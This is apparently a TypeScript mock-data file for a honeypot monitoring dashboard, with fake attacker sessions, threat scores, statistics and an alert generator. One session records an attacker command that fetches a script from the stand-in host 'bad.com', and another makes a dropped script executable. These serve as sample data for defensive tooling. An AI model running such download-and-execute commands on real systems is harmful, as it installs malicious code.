import type { SessionLog, DashboardStats, Alert } from "../types";

export const MOCK_SESSIONS: SessionLog[] = [
  { id: "s1", attacker_ip: "185.112.14.3", honeypot: "cowrie", protocol: "ssh", start_time: new Date(Date.now() - 120000).toISOString(), end_time: null, commands: [{ timestamp: "", command: "wget http://bad.com/malware.sh" }], credentials_tried: [], malware_hashes: [], raw_log: {}, threat_score: 0.85, threat_level: 4, country: "RU", latitude: 55.7558, longitude: 37.6173, vpn_detected: true },
  { id: "s2", attacker_ip: "203.94.1.22", honeypot: "dionaea", protocol: "tcp", start_time: new Date(Date.now() - 400000).toISOString(), end_time: null, commands: [], credentials_tried: [], malware_hashes: [], raw_log: {}, threat_score: 0.6, threat_level: 3, country: "CN", latitude: 35.8617, longitude: 104.1954, vpn_detected: false },
  { id: "s3", attacker_ip: "45.22.19.11", honeypot: "cowrie", protocol: "ssh", start_time: new Date(Date.now() - 600000).toISOString(), end_time: null, commands: [], credentials_tried: [], malware_hashes: [], raw_log: {}, threat_score: 0.4, threat_level: 2, country: "US", latitude: 37.7749, longitude: -122.4194, vpn_detected: false },
  { id: "s4", attacker_ip: "103.111.45.9", honeypot: "cowrie", protocol: "ssh", start_time: new Date(Date.now() - 900000).toISOString(), end_time: null, commands: [{ timestamp: "", command: "chmod +x drop.sh" }], credentials_tried: [], malware_hashes: [], raw_log: {}, threat_score: 0.9, threat_level: 4, country: "IR", latitude: 35.6892, longitude: 51.3890, vpn_detected: true },
  { id: "s5", attacker_ip: "91.240.118.66", honeypot: "dionaea", protocol: "smb", start_time: new Date(Date.now() - 1200000).toISOString(), end_time: null, commands: [], credentials_tried: [], malware_hashes: [], raw_log: {}, threat_score: 0.7, threat_level: 3, country: "RO", latitude: 44.4268, longitude: 26.1025, vpn_detected: false },
  { id: "s6", attacker_ip: "18.232.14.99", honeypot: "cowrie", protocol: "ssh", start_time: new Date(Date.now() - 1500000).toISOString(), end_time: null, commands: [], credentials_tried: [], malware_hashes: [], raw_log: {}, threat_score: 0.1, threat_level: 1, country: "BR", latitude: -23.5505, longitude: -46.6333, vpn_detected: false },
];

export const MOCK_STATS: DashboardStats = {
  total_sessions_24h: 342,
  unique_attackers_24h: 189,
  critical_alerts_24h: 24,
  top_commands: [{ command: "wget", count: 140 }, { command: "chmod", count: 90 }, { command: "curl", count: 45 }],
  attacks_by_hour: Array.from({ length: 24 }).map((_, i) => ({ hour: i, count: Math.floor(Math.random() * 50) + 10 })),
  threat_level_distribution: [{ level: 1, count: 150 }, { level: 2, count: 100 }, { level: 3, count: 50 }, { level: 4, count: 42 }]
};

export function generateMockAlert(): Alert {
  const IPs = ["185.112.14.3", "203.94.1.22", "45.22.19.11", "103.111.45.9"];
  const Msgs = ["Malware drop attempt via wget", "Repeated login failures (brute force)", "Reconnaissance commands executed", "SMB Exploit payload detected"];
  const ran = Math.floor(Math.random() * IPs.length);
  return {
    id: `alt-${Date.now()}`,
    session_id: `s${ran+1}`,
    attacker_ip: IPs[ran],
    threat_level: Math.floor(Math.random() * 2) + 3,
    message: Msgs[ran],
    created_at: new Date().toISOString(),
    acknowledged: false
  };
}
